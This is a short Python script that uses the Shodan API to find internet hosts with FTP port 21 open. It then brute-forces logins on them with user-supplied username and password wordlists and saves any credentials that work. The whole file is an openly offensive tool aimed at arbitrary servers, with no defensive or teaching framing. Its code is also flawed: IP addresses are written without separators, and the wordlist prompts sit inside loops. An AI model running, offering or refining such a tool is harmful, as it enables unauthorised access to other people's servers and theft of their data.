import shodan
import ftplib
from colorama import Fore, init
init()

SHODAN_API_KEY = "YOUR API KEY FROM SHODAN"
api = shodan.Shodan(SHODAN_API_KEY)

def Search():
    results = api.search('port:"21"')
    for result in results['matches']:
        print ('%s' % result['ip_str'])
        IPs = '%s' % result['ip_str']
        f = open("ftplist.txt", "a")
        f.write(IPs)
        f.close()
        brute()

def brute():
    with open(str("ftplist.txt"), 'rb') as bd:
        for userhost in bd:
            loglist = input ("Input LoginList : ")
            loginlist = open(loglist,"r",encoding='utf-8', errors='ignore')
            for login in loginlist:
                passlist = input ("Input PassList : ")
                wordlist = open(passlist,"r",encoding='utf-8', errors='ignore')
                for passwd in wordlist:
                    
                    conect = ftplib.FTP(userhost)
                    ans = conect.login(login.strip(), passwd.strip())
                    
                    if ans ==  "230 Login successful.":
                        print (Fore.GREEN + userhost + " PassFound ", passwd)
                        f1 = open("ftplist.txt", "a")
                        f1.write(userhost + " " + login + ":" + passwd)
                        f1.close() 
                    else:
                        print (Fore.RED + "Password Not Work", login + ":" + passwd)
Search()
    